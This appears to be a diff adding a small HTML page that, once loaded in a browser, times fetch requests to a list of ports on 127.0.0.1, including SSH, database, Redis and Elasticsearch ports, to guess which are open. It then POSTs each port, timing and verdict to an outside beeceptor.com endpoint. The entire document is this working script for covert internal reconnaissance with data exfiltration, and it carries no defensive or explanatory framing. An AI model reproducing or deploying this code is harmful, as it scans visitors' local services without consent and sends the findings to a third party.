@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head><title>Port Timing Checker</title></head>
+<body>
+<h2>Checking Internal Ports With Timed Responses</h2>
+<pre id="log"></pre>
+
+<script>
+function log(msg) {
+  document.getElementById("log").textContent += msg + "\n";
+}
+
+async function testPort(port) {
+  const start = Date.now();
+  try {
+    await fetch(`http://127.0.0.1:${port}/`, { mode: 'no-cors' });
+  } catch (e) {}
+  const end = Date.now();
+  const elapsed = end - start;
+
+  let result = elapsed < 5000 ? "Likely open" : "Probably closed";
+  log(`Port ${port}: ${elapsed}ms -> ${result}`);
+
+  await fetch("https://vodagh.free.beeceptor.com/timing_result", {
+    method: "POST",
+    body: JSON.stringify({ port, ms: elapsed, result }),
+    headers: { "Content-Type": "application/json" }
+  });
+}
+
+[
+  22, 80, 443, 3306, 5432, 6379, 8080, 8081, 8888, 9000, 9200
+].forEach(port => setTimeout(() => testPort(port), 200));
+</script>
+</body>
+</html>
